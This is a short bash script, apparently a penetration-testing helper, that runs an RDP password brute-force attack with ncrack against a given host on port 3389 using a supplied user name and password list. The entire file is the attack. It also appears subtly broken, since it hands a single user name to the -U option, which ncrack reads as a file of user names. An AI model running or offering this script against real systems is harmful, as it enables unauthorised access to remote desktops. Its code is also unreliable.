#!/usr/bin/env bash
# Attempt RDP brute force with ncrack
set -euo pipefail

usage() {
    echo "Usage: $0 <host> <user> <password-list>"
}

if [[ $# -ne 3 ]]; then
    usage
    exit 1
fi

HOST="$1"
USER="$2"
PASSLIST="$3"

if ! command -v ncrack >/dev/null 2>&1; then
    echo "ncrack is required" >&2
    exit 1
fi

ncrack -p 3389 -U "$USER" -P "$PASSLIST" "$HOST"
